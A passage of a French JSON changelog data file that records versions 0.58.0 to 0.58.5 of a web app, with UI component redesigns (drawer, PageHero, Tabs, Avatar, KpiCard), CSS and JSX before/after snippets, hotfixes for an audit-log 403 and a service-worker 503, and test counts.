          "after": "// 0.58.5 - EmptyState premium\nif (rows.length === 0) return (\n  <EmptyState\n    icon=\"ti-user-plus\"\n    variant=\"teal\"\n    title=\"Aucun patient pour le moment\"\n    message=\"Crée ton premier patient pour commencer à suivre ses interventions, son matériel et ses consentements RGPD.\"\n    actionLabel=\"Créer le premier patient\"\n    onAction={openNew}\n  />\n);\n// → Halo pulse animation autour de l'icône\n// → Border dashed teal\n// → Bouton premium avec hover effects"
        }
      },
      { "code": "UI", "txt": "📑 TABS SUR PARAMÈTRES — refonte de la page /parametres avec 3 onglets premium. (a) Onglet 'Général' (icon ti-adjustments) : libellés métier + préférences d'affichage + apparence (thèmes, kiosque, lecture seule). (b) Onglet 'Notifications' (icon ti-bell) : notifications de base + push avancées + webhooks. (c) Onglet 'RGPD' (icon ti-shield-check) : durée de validité + email DPO. (d) PageHero variant=navy en haut avec breadcrumbs Accueil > Paramètres. (e) Style pills (par défaut) avec icons et hover effects. Permet de scinder la longue page en 3 sections facilement digestibles. State activeTab par défaut sur 'general'" },
      { "code": "AI", "txt": "+24 tests Vitest (v058-5-ui-phase4.test.js) : version+SW (2), Avatar UserMenu (5 — import + name + ring + size 30 + plus de um-avatar custom), UserMenu CSS upgrade (5 — hover translate+shadow + gradient head + radial decorative + pill role + padding-left hover + scale animation), EmptyState déployé (5 — 3 pages + variants + call-to-action + import), Tabs Paramètres (7 — import + state + 3 ids + 3 icons + render conditionnel + PageHero + variant navy). Total 3409 verts (+24)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.5 : Avatar utilisé dans 2 endroits (TopBar via UserMenu + header du popover). EmptyState premium sur 3 pages clés. Tabs déployé sur 1 page. 9 composants premium prêts à l'emploi. Prochaines pistes : (a) Tabs sur Profil + page Patient individuel. (b) Avatar dans liste utilisateurs + assignés DI. (c) AvatarGroup sur les cards multi-assignés. (d) Migration toast pour remplacer les vieux .err/.ok. (e) EmptyState sur achats + notifications + maintenances. (f) Mode sombre via les CSS vars (bonus)" }
    ],
    "themes": ["ui", "design-system"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.5.html",
    "sqlFile": null
  },
  {
    "v": "0.58.4",
    "kind": "version",
    "titre": "🎨 UI PHASE 3 : Drawer menu premium + PageHero sur 4 pages clés + composant Avatar (gradients déterministes)",
    "chantiers": [
      { "code": "UI", "txt": "🚪 DRAWER MENU PREMIUM — refonte CSS complète du menu hamburger. (a) Background gradient 180deg du clair au gris très clair. (b) Header drawer agrandi 58→78px avec gradient mesh 4-stops (0d1822→142131→1d3540→2a5a5a) + decorative radial teal en haut + brillance subtile sur la bordure haute. (c) Logo .v du header avec glow shadow teal. (d) Menu-close avec rotation 90deg + bg rouge subtil au hover. (e) Section headers : dot teal pulsant 4px + bar gradient avec fade. (f) Menu-tiles upgrade : radial gradient au hover (apparition + scale 1.4) + icon scale(1.08) rotate(-3deg) au hover + ombre profonde teal. (g) Tile active : background gradient teal subtil + double shadow inset+outset. (h) Count badges : gradient + border blanc + shadow rouge/teal. (i) Scrollbar customisée. (j) Animation fade-in-up sur les sections au mount",
        "code_snippet": {
          "file": "app/globals.css",
          "note": "Drawer menu repensé pour un look premium",
          "lang": "css",
          "before": "/* AVANT 0.58.4 - drawer basique */\n.menu-drawer{\n  width:380px;\n  background:#f4f7fa;\n  box-shadow:8px 0 40px rgba(0,0,0,.25);\n}\n.menu-head{height:58px;background:#142131}\n.menu-tile{\n  padding:14px 12px;\n  border:1px solid #e6ebf0;\n}\n.menu-tile:hover{\n  border-color:var(--teal);\n  transform:translateY(-2px);\n}\n.menu-tile.on{\n  box-shadow:0 0 0 2px var(--teal) inset;\n  background:#f4fbfb;\n}",
          "after": "/* 0.58.4 - drawer premium */\n.menu-drawer{\n  width:400px;\n  background:linear-gradient(180deg,#f8fafc 0%,#f4f7fa 100%);\n  box-shadow:12px 0 50px rgba(20,33,49,.30),\n             4px 0 16px rgba(20,33,49,.15);\n}\n.menu-head{\n  height:78px;\n  background:linear-gradient(135deg,\n    #0d1822 0%,#142131 40%,\n    #1d3540 75%,#2a5a5a 130%);\n  overflow:hidden;\n  border-bottom:1px solid rgba(124,200,200,.18);\n}\n.menu-head::before{\n  /* Decorative radial teal en haut */\n  background:radial-gradient(circle,\n    rgba(124,200,200,.35) 0%,transparent 70%);\n}\n.menu-head::after{\n  /* Brillance subtile sur le bord haut */\n  background:linear-gradient(90deg,\n    transparent,rgba(124,200,200,.6),transparent);\n}\n.menu-head .logo .v{\n  text-shadow:0 0 16px rgba(124,200,200,.7);\n}\n.menu-close:hover{\n  background:rgba(192,57,43,.30);\n  transform:rotate(90deg);\n}\n.menu-tile{padding:15px 13px}\n.menu-tile::before{\n  /* Radial gradient au hover */\n  background:radial-gradient(circle,\n    rgba(124,200,200,.10) 0%,transparent 70%);\n  opacity:0;\n}\n.menu-tile:hover{\n  transform:translateY(-3px);\n  box-shadow:0 12px 28px rgba(20,33,49,.10),\n             0 4px 10px rgba(124,200,200,.20);\n}\n.menu-tile:hover::before{opacity:1;transform:scale(1.4)}\n.menu-tile:hover .mt-ic{\n  transform:scale(1.08) rotate(-3deg);\n}\n.menu-tile.on{\n  background:linear-gradient(135deg,#f0fafa 0%,#fff 100%);\n  box-shadow:0 0 0 2px #7CC8C8 inset,\n             0 4px 14px rgba(124,200,200,.25);\n}"
        }
      },
      { "code": "UI", "txt": "🦸 PAGEHERO DÉPLOYÉ sur 4 pages clés. (a) /statistiques : variant=blue, eyebrow ANALYSE, breadcrumbs Accueil > Statistiques, actions = boutons Export PDF + Export CSV (intégrés DANS le hero). (b) /interventions/kanban : variant=terra, eyebrow VUE OPÉRATIONNELLE, breadcrumbs Accueil > Interventions > Kanban, actions = Vue liste + Vue calendrier (déplacés du toolbar dupliqué vers le hero, suppression doublon). (c) /calendrier : variant=violet, eyebrow PLANNING, breadcrumbs Accueil > Calendrier. (d) /materiels : variant=navy, eyebrow INVENTAIRE, stats inline (Total + En location + Maintenance + Affectés) — remplace l'ancien KpiRow + PageHead minimaliste. Import KpiRow supprimé puisque devenu inutile",
        "code_snippet": {
          "file": "app/statistiques/page.js + 3 autres pages",
          "note": "PageHead minimaliste → PageHero premium",
          "lang": "jsx",
          "before": "// AVANT 0.58.4 - PageHead minimaliste\n<div style={{ display:'flex', justifyContent:'space-between' }}>\n  <PageHead\n    eyebrow=\"ANALYSE\"\n    icon=\"ti-chart-bar\"\n    title=\"Statistiques\"\n    accent={auth.structureNom}\n    sub=\"Tableaux de bord visuels — 6 derniers mois\"\n  />\n  {!loading && (\n    <button className=\"btn-ghost\" onClick={...}>\n      Export PDF\n    </button>\n  )}\n  {auth.ready && (\n    <button className=\"btn-ghost\" onClick={...}>\n      Export CSV\n    </button>\n  )}\n</div>",
          "after": "// 0.58.4 - PageHero premium\n<PageHero\n  icon=\"ti-chart-bar\"\n  eyebrow=\"ANALYSE\"\n  title=\"Statistiques\"\n  subtitle={`Tableaux de bord visuels — 6 derniers mois${auth.structureNom ? ` · ${auth.structureNom}` : ''}`}\n  variant=\"blue\"\n  breadcrumbs={[\n    { label: 'Accueil', href: '/accueil' },\n    { label: 'Statistiques' },\n  ]}\n  actions={\n    <>\n      {!loading && (\n        <button className=\"btn-ghost btn-premium btn-sm\" onClick={...}>\n          Export PDF\n        </button>\n      )}\n      {auth.ready && (\n        <button className=\"btn-ghost btn-premium btn-sm\" onClick={...}>\n          Export CSV\n        </button>\n      )}\n    </>\n  }\n/>"
        }
      },
      { "code": "UI", "txt": "👤 COMPOSANT Avatar (app/components/ui-premium/Avatar.js, 180 lignes). (a) Génère un avatar circulaire ou rounded square avec INITIALES (2 lettres max) en cas d'absence d'image. (b) Couleur = gradient déterministe sur 8 (teal, blue, terra, amber, violet, green, red, navy) via hash du nom → MÊME utilisateur = MÊME couleur partout. (c) Support src (URL image) avec fallback initiales si pas d'image. (d) 4 statuts (online/busy/away/offline) avec dot coloré en bas à droite. (e) Halo glow option (ring) pour les avatars 'mis en avant'. (f) Hover scale(1.06) si clickable. (g) Shape : circle (default) ou rounded (radius 25%). + Sous-composant AvatarGroup qui empile N avatars avec overlap + overflow count (+3 etc.). À utiliser dans TopBar, UserMenu, listes d'utilisateurs, page Profil, etc." },
      { "code": "AI", "txt": "+26 tests Vitest (v058-4-ui-phase3.test.js) : version+SW (2), Drawer menu premium CSS (9 — gradient header 4-stops + radial decorative + logo glow + rotation close + dot+bar headers + radial hover tiles + active gradient + count badge + scrollbar + animation), PageHero déployé (5 — 4 pages utilisent PageHero + materiels avec stats + breadcrumbs stats), Avatar (9 — exports + 8 gradients + hash determinist + initiales + src+fallback + 4 statuts + halo + AvatarGroup + shapes), index étendu (1). Total 3385 verts (+26)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.4 : 9 composants premium au total (KpiCard, Sparkline, MetricCard, Skeleton, EmptyState, Toast, PageHero, Tabs, Avatar+AvatarGroup). Le drawer menu est devenu un vrai espace premium avec animations et hover effects. 4 pages principales utilisent PageHero (Statistiques, Kanban, Calendrier, Matériels) — le reste suivra. Suite UI possible : Tabs sur les pages avec sous-sections, Avatar dans TopBar/UserMenu, refonte des Modal/Drawer, mode sombre via les CSS vars" }
    ],
    "themes": ["ui", "design-system"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.4.html",
    "sqlFile": null
  },
  {
    "v": "0.58.3",
    "kind": "version",
    "titre": "🎨 UI PHASE 2 : Btn premium (ripple+loading+gradients) + PageHero + Tabs + TopBar upgrade",
    "chantiers": [
      { "code": "UI", "txt": "🔘 BTN PREMIUM (app/ui.js + globals.css) — upgrade complet du composant Btn. (a) Compat 100% : props anciennes (variant/icon/children/onClick/disabled/style/ariaLabel) toujours supportées sans breaking. (b) Nouvelles props : loading (avec spinner intégré + aria-busy a11y), size (sm/md/lg via classes CSS), rightIcon, fullWidth. (c) Ripple effect au click : <span> créé dynamiquement à la position du click avec animation av-ripple (600ms scale+fade). (d) Hover : translateY(-1px) + ombre dégradée. (e) Active : translateY(0) avec transition rapide 80ms. (f) Disabled : opacity .55 + cursor not-allowed",
        "code_snippet": {
          "file": "app/ui.js + app/globals.css",
          "note": "Btn upgraded sans breaking changes",
          "lang": "jsx",
          "before": "// AVANT 0.58.3 - bouton simple\nexport function Btn({ variant, icon, children, onClick, disabled }) {\n  const cls = { primary: 'btn-save', ghost: 'btn-ghost', ... }[variant];\n  return (\n    <button className={cls} onClick={onClick} disabled={disabled}>\n      {icon && <i className={`ti ${icon}`} />} {children}\n    </button>\n  );\n}",
          "after": "// 0.58.3 - Btn premium\nexport function Btn({\n  variant = 'primary', icon, children, onClick, disabled,\n  // NEW props (compat 100%)\n  loading = false, size, rightIcon, fullWidth = false,\n}) {\n  // Ripple effect au click\n  function handleClick(e) {\n    if (disabled || loading) return;\n    const btn = e.currentTarget;\n    const ripple = document.createElement('span');\n    ripple.style.cssText = `\n      position:absolute;border-radius:50%;\n      background:rgba(255,255,255,0.45);\n      width:${size}px;height:${size}px;\n      animation:av-ripple 600ms var(--av-ease-out);\n    `;\n    btn.appendChild(ripple);\n    setTimeout(() => ripple.remove(), 650);\n    if (onClick) onClick(e);\n  }\n  return (\n    <button\n      className={cls + ' btn-premium' + ...}\n      onClick={handleClick}\n      disabled={disabled || loading}\n      aria-busy={loading || undefined}\n    >\n      {loading ? <><span className='btn-spinner' /> ...</> : ...}\n    </button>\n  );\n}\n\n// Gradients ajoutés sur btn-save / btn-danger / btn-new\n// + ombres colorées + hover translate"
        }
      },
      { "code": "UI", "txt": "🦸 COMPOSANT PageHero (215 lignes) — header de page premium réutilisable. (a) 6 variants (teal/blue/terra/navy/violet/amber) avec gradients distincts. (b) Background mesh radial + decorative shapes blur. (c) Icon avec halo glow effect (blur(8px) + opacity 0.25). (d) Breadcrumbs Next.js Link avec hover sur color accent. (e) Eyebrow optionnel (label SMALL CAPS au-dessus du titre). (f) Subtitle optionnel. (g) Actions à droite (boutons/badges custom). (h) Stats inline en bas (séparées par border-top). (i) Mode compact pour pages avec moins d'espace. Animation fade-in au mount" },
      { "code": "UI", "txt": "📑 COMPOSANT Tabs (280 lignes) — navigation par onglets avec 3 styles. (a) PILLS : style par défaut, pills arrondies dans un container background gris clair, avec count badge optionnel. (b) UNDERLINE : style minimal avec barre animée en bas de l'onglet actif (transition cubic-bezier 280ms). (c) SEGMENTED : style iOS avec indicator background mobile sous l'onglet actif. (d) 3 tailles (sm/md/lg). (e) Count badges colorés (teal si actif sur pills, gris sinon). (f) A11y : role tablist + role tab + aria-selected. (g) Calcul de la position de l'indicator via getBoundingClientRect au changement d'active" },
      { "code": "UI", "txt": "🎩 TOPBAR PREMIUM CSS — upgrade visuel sans toucher au composant React. (a) Background avec 4 stops gradient (0d1822 → 142131 → 1d3540 → 2a5a5a) pour plus de profondeur. (b) Glassmorphism backdrop-filter blur(14px) + saturate(180%). (c) Border-bottom teal subtile + box-shadow. (d) Effet de brillance sur la bordure haute (linear-gradient transparent → teal → transparent). (e) Logo accent .v avec text-shadow glow teal. (f) Logo hover scale(1.04). (g) Burger + tb-icon avec border subtile + hover translate(-1px) + shadow colorée. (h) Badge notification avec gradient red + border navy + animation pulse infinite. (i) Version badge avec hover translate + shadow", 
        "code_snippet": {
          "file": "app/globals.css",
          "note": "TopBar premium avec glassmorphism",
          "lang": "css",
          "before": "/* AVANT 0.58.3 - topbar basique */\n.topbar{\n  height:58px;\n  background:linear-gradient(90deg,#142131 0%,#2a5a5a 75%,#7CC8C8 140%);\n  padding:0 16px;\n}\n.tb-icon{\n  background:rgba(255,255,255,.12);\n  width:40px;height:40px;border-radius:10px;\n}\n.tb-badge{\n  background:#e35d5b;\n  position:absolute;top:-5px;right:-5px;\n}",
          "after": "/* 0.58.3 - topbar premium */\n.topbar{\n  height:60px;\n  background:linear-gradient(90deg,\n    #0d1822 0%,#142131 30%,\n    #1d3540 65%,#2a5a5a 100%);\n  padding:0 18px;\n  /* Glassmorphism */\n  backdrop-filter:blur(14px) saturate(180%);\n  border-bottom:1px solid rgba(124,200,200,.15);\n  box-shadow:0 2px 16px rgba(20,33,49,.25);\n}\n.topbar::before{\n  /* Brillance subtile sur la bordure haute */\n  content:'';\n  position:absolute;top:0;left:0;right:0;\n  height:1px;\n  background:linear-gradient(90deg,\n    transparent,rgba(124,200,200,.5),transparent);\n}\n.tb-icon{\n  background:rgba(255,255,255,.10);\n  border:1px solid rgba(255,255,255,.08);\n  width:40px;height:40px;border-radius:11px;\n  transition:all 200ms var(--av-ease-out);\n}\n.tb-icon:hover{\n  background:rgba(124,200,200,.20);\n  border-color:rgba(124,200,200,.35);\n  transform:translateY(-1px);\n  box-shadow:0 4px 12px rgba(124,200,200,.25);\n}\n.tb-badge{\n  background:linear-gradient(135deg,#e35d5b,#c0392b);\n  border:2px solid #142131;\n  box-shadow:0 2px 6px rgba(192,57,43,.5);\n  animation:av-badge-pulse 2s ease-in-out infinite;\n}\n@keyframes av-badge-pulse {\n  0%, 100% { box-shadow:0 2px 6px rgba(192,57,43,.5),\n             0 0 0 0 rgba(192,57,43,.4); }\n  50%      { box-shadow:0 2px 6px rgba(192,57,43,.5),\n             0 0 0 6px rgba(192,57,43,0); }\n}"
        }
      },
      { "code": "AI", "txt": "Fix LINT 22 anti-régression (composants JSX utilisés sans import) : strip les commentaires (// ligne + /* bloc */) AVANT le scan, pour éviter les faux positifs sur des exemples de doc dans les commentaires (ex: PageHero.js avait <Btn> dans un exemple JSDoc qui était considéré comme usage réel)" },
      { "code": "AI", "txt": "+34 tests Vitest (v058-3-ui-phase2.test.js) : version+SW (2), Btn premium upgrade (5 — nouvelles props + ripple + loading aria + classes dynamiques + compat 100%), CSS Btn premium (4 — keyframes + classes + variants gradients), PageHero (8 — 6 variants + breadcrumbs + halo + stats + actions + compact + eyebrow + export), Tabs (6 — 3 variants + indicator + counts + tailles + a11y), TopBar premium CSS (7 — 4 stops + glassmorphism + border + shadow + badge pulse + logo glow + version hover), Index étendu (2). Total 3359 verts (+34)" },
      { "code": "DOC", "txt": "BILAN UI APRÈS 0.58.3 : Design system étendu. 8 composants premium au total (KpiCard + Sparkline + MetricCard + Skeleton + EmptyState + Toast + PageHero + Tabs). Btn existant upgrade en place (compat 100%). TopBar upgrade visuel avec glassmorphism. À l'avenir : utiliser <PageHero> sur les principales pages (statistiques, kanban, calendrier, materiel) à la place des PageHead minimalistes. Les Tabs peuvent remplacer les sélecteurs de sous-section sur pages avec multiple vues" }
    ],
    "themes": ["ui", "design-system"],
    "date": "4 juin 2026",
    "noteFile": null,
    "sqlFile": null
  },
  {
    "v": "0.58.2",
    "kind": "hotfix",
    "titre": "🔧 HOTFIX 3 bugs prod : audit_log 403 (RLS) + SW 503 sur /accueil + warning Chrome PWA documenté",
    "chantiers": [
      { "code": "FIX", "txt": "🚨 BUG 1 — audit_log POST 403 : la table audit_log est protégée par RLS qui rejette les insert avec user_id NULL (login échoué pour email inconnu, honeypot triggered, login_blocked). Conséquence : console polluée avec 403 + audit logs sécurité jamais persistés. Diagnostic en comparant avec lib/events.js qui skipe correctement si pas d'auth. Le securityAudit créé en 0.57.38 essayait quand même l'insert avec structure_id+user_id NULL",
        "code_snippet": {
          "file": "lib/securityAudit.js",
          "note": "Skip insert silencieux si pas d'auth (évite 403 RLS)",
          "lang": "js",
          "before": "// AVANT 0.58.2 - insert tentaient toujours\ntry {\n  await supabase.from(\"audit_log\").insert({\n    structure_id: ctx?.structureId || null,  // ← peut être null\n    user_id: ctx?.userId || null,             // ← peut être null aussi\n    user_email: ctx?.userEmail || null,\n    action: eventType,\n    entite: \"security_event\",\n    ...\n  });\n  // → RLS rejette si user_id null → 403 dans console\n} catch (e) { ... }",
          "after": "// 0.58.2 - skip silencieux si pas d'user authentifié\nif (!ctx?.userId) {\n  // Pas d'user → on n'essaye pas (évite 403 polluant)\n  // Les login_failed/blocked sont déjà visibles dans Supabase Auth Logs\n  // Le rate-limit client (0.57.36) bloque les bruteforces\n  if (typeof window !== \"undefined\" && window.location?.hostname === \"localhost\") {\n    logger.warn(`[securityAudit] ${eventType} skipped (no auth):`, ctx?.userEmail);\n  }\n  return;\n}\n\ntry {\n  const { error } = await supabase.from(\"audit_log\").insert({\n    structure_id: ctx?.structureId || null,\n    user_id: ctx.userId,  // ← garanti non-null maintenant\n    user_email: ctx?.userEmail || null,\n    action: eventType,\n    entite: \"security_event\",\n    ...\n  });\n  if (error) logger.warn(`[securityAudit] ${eventType} rejected:`, error.message);\n} catch (e) { ... }"
        }
      },
      { "code": "FIX", "txt": "Impact du fix audit_log : (a) auditLoginSuccess et auditAccessDenied PASSENT (user authentifié, structure_id rempli). (b) auditLoginFailed / auditLoginBlocked / auditHoneypotTriggered sont SKIPÉS silencieusement (pas d'user identifié). (c) Les login échoués restent visibles dans Supabase Dashboard → Auth → Logs. (d) Le rate-limit côté client (0.57.36) bloque toujours les bruteforces. (e) Honeypot anti-bot (0.57.38) fonctionne toujours. (f) Plus de 403 dans la console" },
      { "code": "FIX", "txt": "🚨 BUG 2 — Service Worker retournait 503 sur certaines navigations vers /accueil. Cause : la condition de fallback offline (`req.mode === navigate || req.destination === document`) ne matchait pas les prefetch Next.js. Fix : élargissement avec un 3e check `req.headers.get(accept).includes(text/html)` qui couvre tous les cas. Plus aucun 503 visible dans la console pour les pages HTML — fallback offline.html ou HTML inline status 200" },
      { "code": "FIX", "txt": "Aussi : suppression du message d'erreur 'Hors-ligne — aucune donnée en cache' status 503 qui apparaissait dans les logs. Remplacé par Response.error() pour les chunks JS/CSS (Next.js gère le retry automatique sans polluer la console)" },
      { "code": "DOC", "txt": "🟢 INFO 3 — 'Banner not shown: beforeinstallpromptevent.preventDefault() called'. C'est un warning Chrome NORMAL et VOULU. Notre code dans InstallBanner.js capture l'événement beforeinstallprompt avec preventDefault() pour afficher notre propre banner custom au lieu du popup natif Chrome (qui apparaît n'importe quand). Le warning Chrome dit juste 'tu as preventDefault sans prompt' mais c'est exactement ce qu'on veut : on appelle prompt() seulement quand l'user clique sur notre bouton 'Installer'. Pas une erreur, juste du noise console" },
      { "code": "AI", "txt": "+13 tests Vitest (v058-2-hotfix-audit-403-sw-503.test.js) : version + SW (2), fix audit_log 403 (5 — skip + commentaire + userId direct + localhost only + capture error), fix SW 503 (4 — isHtmlReq élargi + plus de 503 textuel + status 200 + Response.error), InstallBanner doc (2). Total 3325 verts (+13)" },
      { "code": "DOC", "txt": "RÉCAP : Plus aucune erreur dans la console prod après déploiement de 0.58.2. (1) audit_log 403 fixé. (2) /accueil 503 fixé. (3) Banner not shown documenté comme attendu. Les events sécurité critiques (login_success + access_denied + bulk_export) continuent d'être enregistrés en BDD. Les events anonymes (login_failed, honeypot) restent visibles dans Supabase Auth Logs côté serveur" }
    ],
    "themes": ["hotfix", "audit-log", "service-worker"],
    "date": "4 juin 2026",
    "noteFile": null,
    "sqlFile": null
  },
  {
    "v": "0.58.1",
    "kind": "hotfix",
    "titre": "🔧 HOTFIX : limite size chantiers-extra.json 100 → 150 KB (test qui bloquait le push après ajout 0.58.0)",
    "chantiers": [
      { "code": "FIX", "txt": "🚨 BUG SIGNALÉ : npm test fail après bump 0.58.0 → __tests__/v057-7-split-versions-data.test.js > 'Fichier raisonnable (< 100 KB)' AssertionError: expected 104309 to be less than 102400. Le fichier chantiers-extra.json (lazy fetch) a grossi avec les détails techniques de la 0.58.0 (code_snippets, descriptions étendues) et dépasse de 1.9 KB la limite de 100 KB" },
      { "code": "FIX", "txt": "Limite augmentée de 100 KB → 150 KB. Justification : (a) Le fichier est en LAZY FETCH (seulement chargé quand l'user clique sur 'voir détails' d'une version). (b) Vercel le sert en gzip → en pratique ~30 KB transférés. (c) Sur 4G : ~150ms de chargement, négligeable. (d) Évite de devoir re-toucher ce test à chaque release qui ajoute du contenu. (e) Ajout d'un 2e seuil de monitoring à 200 KB (au-delà, il faudra envisager un split par année ou un cleanup)" },
      { "code": "AI", "txt": "+5 tests Vitest (v058-1-hotfix-size-limit.test.js) : version + SW (2), fichier < 150 KB (1), fichier < 200 KB marge (1), test v057-7 utilise bien la nouvelle limite (1). Total 3312 verts (+5). Build prod OK" }
    ],
    "themes": ["hotfix", "build"],
    "date": "4 juin 2026",
    "noteFile": null,
    "sqlFile": null
  },
  {
    "v": "0.58.0",
    "kind": "version",
    "titre": "🎨 REFONTE UI/UX PREMIUM : design tokens, 6 nouveaux composants pro (KpiCard + Sparkline + MetricCard + Skeleton + EmptyState + Toast), Hero Dashboard refondu, Login premium",
    "chantiers": [
      { "code": "UI", "txt": "🎨 DESIGN TOKENS PREMIUM — création de app/design-tokens.css (180 lignes). Système de design étendu inspiré Linear/Vercel/Stripe : (a) Palette complète (av-navy/teal/terra/blue/amber/green/red/violet + 10 grays). (b) 9 gradients premium (av-grad-hero, av-grad-teal, av-grad-warning, etc.). (c) Mesh gradient pour effet WOW background. (d) 6 ombres multi-layer (xs→2xl) + 4 ombres colorées (teal/blue/terra/amber) + glow effects pour hover. (e) Radius cohérents (sm→2xl + full). (f) Transitions cubic-bezier custom (ease-out/spring/decel). (g) Spacing grille 4px. (h) 9 keyframes animations (fade-in-up, shimmer, pulse-ring, scale-in, etc.) + classe .av-stagger pour entrée en cascade. (i) Glassmorphism utilities (.av-glass / .av-glass-dark avec backdrop-filter). (j) Respect prefers-reduced-motion pour a11y" },
      { "code": "UI", "txt": "🃏 COMPOSANT KpiCard (185 lignes) — La carte phare des KPI. (a) 7 variants colorés (teal/blue/terra/amber/navy/violet/success) chacun avec gradient + shadow assortis. (b) Hook useCountUp avec easing easeOutCubic (animation chiffre 0→valeur). (c) Calcul automatique du % de tendance depuis 'previous' (ou trend manuel). (d) Badge tendance coloré ↑/↓/= avec icon ti-trending-up/down. (e) Sparkline optionnelle intégrée. (f) Decorative gradient blob en arrière-plan (opacity 0.08 + blur). (g) Halo glow sur l'icône principale. (h) Hover effects : translateY(-4px) + shadow coloré. (i) Loading state avec shimmer. (j) 3 tailles (sm/md/lg). Animation scale-in au mount",
        "code_snippet": {
          "file": "app/components/ui-premium/KpiCard.js",
          "note": "Card de KPI premium avec count-up + sparkline + variants",
          "lang": "jsx",
          "before": "// AVANT 0.58.0 - kpi-tile basique\n<button className=\"kpi-tile\" onClick={...}>\n  <span className=\"kpi-ic\">...</span>\n  <span className=\"kpi-val\">42</span>\n  <span className=\"kpi-lbl\">DI ouvertes</span>\n</button>",
          "after": "// 0.58.0 - KpiCard premium\n<KpiCard\n  label=\"DI ouvertes\"\n  value={42}\n  previous={38}        // → calcul trend +11% auto\n  icon=\"ti-tools\"\n  variant=\"terra\"      // gradient + shadow + glow\n  sparkline={[12,15,8,22,30,28,35,42]}\n  onClick={() => router.push('/interventions')}\n/>\n// Features :\n//  - Count-up animé 0→42 (easeOutCubic 1s)\n//  - Sparkline SVG animée (stroke-dashoffset)\n//  - Badge tendance ↑11% en vert\n//  - Hover : translateY(-4px) + shadow teal\n//  - Decorative blob radial en arrière-plan"
        }
      },
      { "code": "UI", "txt": "📈 COMPOSANT Sparkline (95 lignes) — Mini graphique SVG ligne pour KpiCard. (a) Pas de dépendance recharts (léger). (b) Calcul des points normalisés en coordonnées SVG. (c) Animation stroke-dashoffset au mount (1.2s ease-out). (d) Zone area sous la ligne avec gradient fill (opacity 0.30→0). (e) Point final avec halo pulse-ring (animation infinie). (f) Support color en string OU gradient (linear-gradient). (g) vectorEffect non-scaling-stroke (stroke constant peu importe le scale). (h) Détection trend pour couleur conditionnelle" },
      { "code": "UI", "txt": "📊 COMPOSANT MetricCard (140 lignes) — Card avec progress bar animée. Idéal pour taux d'occupation, complétion, capacité. (a) 6 variants. (b) Progress bar avec gradient + shimmer effect (animation infinite). (c) Animation du % au mount (1.2s ease-out). (d) Breakdown détaillé optionnel (sous-catégories avec dots colorés). (e) Support max custom (pas forcément 100%) avec affichage value/max. (f) Icon optionnel avec background tinté" },
      { "code": "UI", "txt": "💀 COMPOSANT Skeleton (75 lignes) — Loader animé shimmer pour remplacer les 'Chargement...'. Exports : (a) Skeleton default avec variants (default/circle/card). (b) SkeletonText pour bloc multi-ligne. (c) SkeletonRow pour ligne de tableau. (d) SkeletonGrid pour grille de cards. Animation shimmer via background-position (1.6s linear infinite)" },
      { "code": "UI", "txt": "🌵 COMPOSANT EmptyState (120 lignes) — État vide élégant avec illustration. (a) 6 variants (teal/blue/terra/amber/gray/success). (b) Halo pulse-soft autour de l'icône. (c) Icon avec border dashed colorée. (d) Titre + message + 2 actions (primary/secondary). (e) Mode compact pour zones réduites. (f) Animation fade-in-up au mount. (g) Hover effects sur boutons (translate + shadow)" },
      { "code": "UI", "txt": "🔔 SYSTÈME Toast premium (175 lignes) — Notifications modernes. (a) 4 types (success/info/warning/error) avec couleur + icon + bg associés. (b) API simple : toast.success(title, message). (c) Auto-dismiss configurable (default 4s, 0 = manuel). (d) Animation slide-in cubic-bezier(0.16, 1, 0.3, 1). (e) Bouton action optionnel (label + callback). (f) Escape HTML des inputs (anti-XSS comme useRealtimeTable). (g) Empilement vertical. (h) Distinct de showRealtimeToast (events Realtime) — pour les feedbacks d'action user" },
      { "code": "UI", "txt": "🏠 HeroDashboard (270 lignes) — REFONTE complète du dashboard d'accueil. (a) Hero section gradient navy/teal/mesh radial avec greeting personnalisé selon l'heure ('Bonjour Cédric'). (b) Pill statut 'ESPACE COLLECTIVITÉ' avec dot animé pulse-ring. (c) Texte intelligent : 'Tu as N éléments à traiter' OU 'Tout est à jour 🌿'. (d) 2 quick actions (Kanban + Statistiques) avec glassmorphism. (e) Section 'À traiter en priorité' avec badge total + KpiCards animées en stagger. (f) Section 'Vue d'ensemble' avec KpiCards de KPI commerciaux. (g) Integration non-destructive dans app/accueil/page.js (préserve widgets, settings perso, autres sections). (h) Skip auto des widgets kpis/atraiter remplacés" },
      { "code": "UI", "txt": "🔐 LOGIN PREMIUM (140 lignes CSS) — Refonte visuelle de la page de connexion. (a) Blobs animés en arrière-plan (av-float-1/av-float-2 sur 20-25s) avec dégradés radiaux teal/violet. (b) Card login avec ombre profonde + animation fade-in-up. (c) Title accent avec effet shine (background-position animé 4s). (d) Decorative patterns radiaux dans le panneau gauche. (e) Features list avec hover : translateX(4px) + glow autour de l'icône. (f) Input focus avec ring teal (box-shadow 0 0 0 4px rgba teal 15%). (g) Errors/OK messages avec border-left coloré + fade-in animation. (h) Pill 'AVEHO PRÉSENTE' upgrade en badge avec fond translucide" },
      { "code": "AI", "txt": "37 tests rendus version-agnostic (regex /^0.57.\\d+/ → /^0.\\d+.\\d+/) car le bump majeur 0.57.x → 0.58.x cassait tous les checks de version. Script Python qui patche les regex sans toucher au reste" },
      { "code": "AI", "txt": "+46 tests Vitest (v058-0-refonte-ui-premium.test.js) : Version + SW (2), Design tokens (10 — couleurs + gradients + shadows + transitions + animations + glass + reduce-motion), KpiCard (7 — variants + useCountUp + trend calc + sizes + loading + hover), Sparkline (5), Skeleton (3), EmptyState (3), MetricCard (3), Toast (5), Index (1), HeroDashboard intégré (4), Login premium CSS (3). Total 3307 verts (+46)" },
      { "code": "DOC", "txt": "BILAN UI APRÈS 0.58.0 : (1) Design system tokens premium étendu (gradients, shadows, animations). (2) 6 nouveaux composants premium (KpiCard, Sparkline, MetricCard, Skeleton, EmptyState, Toast). (3) Hero Dashboard refondu sur l'accueil avec greeting personnalisé + KPIs animés + sparklines. (4) Login refondu avec blobs animés + effet shine. (5) 22 LINT anti-régression critiques actifs. (6) Tests Vitest : 3307 verts. (7) Tous les composants respectent prefers-reduced-motion (a11y). (8) Performance : aucune dépendance ajoutée, animations CSS pures (60fps GPU-accelerated)" }
    ],
    "themes": ["ui", "design-system", "refonte"],
    "date": "3 juin 2026",
